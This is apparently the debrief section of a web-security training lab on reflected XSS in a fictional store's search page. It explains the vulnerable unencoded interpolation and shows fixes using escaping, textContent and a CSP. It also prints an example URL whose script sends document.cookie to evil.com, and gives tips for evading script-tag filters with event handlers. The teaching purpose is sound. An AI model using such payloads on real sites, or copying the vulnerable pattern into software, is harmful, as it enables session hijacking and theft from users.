<!-- ── Debrief (shown after completion) ── -->
<div class="lab-debrief" id="lab-debrief">
  <div class="lab-debrief-label">Debrief — Reflected XSS</div>

  <h3>What happened</h3>
  <p>ShopStack's search page takes the user's query parameter and inserts it directly into the HTML response using string interpolation. Because the input is not encoded, any HTML or JavaScript in the query becomes part of the page's DOM and executes in the user's browser.</p>

  <h3>The vulnerable code</h3>
  <pre>res.send(`&lt;h2&gt;Results for: ${query}&lt;/h2&gt;`);
// query comes directly from req.query.q — no encoding</pre>

  <h3>The fix</h3>
  <p>Replace special HTML characters with their entity equivalents before inserting into HTML. Better yet, use a templating engine with auto-escaping (EJS, Handlebars, React JSX) and add a Content Security Policy header.</p>
  <pre>// Option 1: Manual encoding
const safe = query
  .replace(/&amp;/g, '&amp;amp;')
  .replace(/&lt;/g, '&amp;lt;')
  .replace(/&gt;/g, '&amp;gt;');

// Option 2: Use textContent instead of innerHTML
element.textContent = query;

// Option 3: Add CSP
res.setHeader('Content-Security-Policy',
  "default-src 'self'; script-src 'self'");</pre>

  <h3>Real-world impact</h3>
  <p>In a real attack, the attacker crafts a malicious URL like <code>https://shopstack.com/search?q=&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</code> and sends it to a victim via email or social media. When the victim clicks the link, the script executes in their authenticated browser session — stealing cookies, CSRF tokens, or performing actions as the victim.</p>
  <p><strong>British Airways (2018):</strong> Attackers injected malicious JavaScript via a compromised third-party script, capturing payment card details from 380,000 customers as they typed them into the checkout form. The attack ran for 15 days before detection.</p>

  <h3>How to find this in the wild</h3>
  <p>During a pentest, search for any place user input appears in the HTML response. Test with a benign probe like <code>&lt;b&gt;test&lt;/b&gt;</code>. If the text renders bold, the input is being treated as HTML. Escalate by injecting event handlers (<code>onerror</code>, <code>onload</code>, <code>onfocus</code>) rather than <code>&lt;script&gt;</code> tags, which are more likely to be filtered.</p>

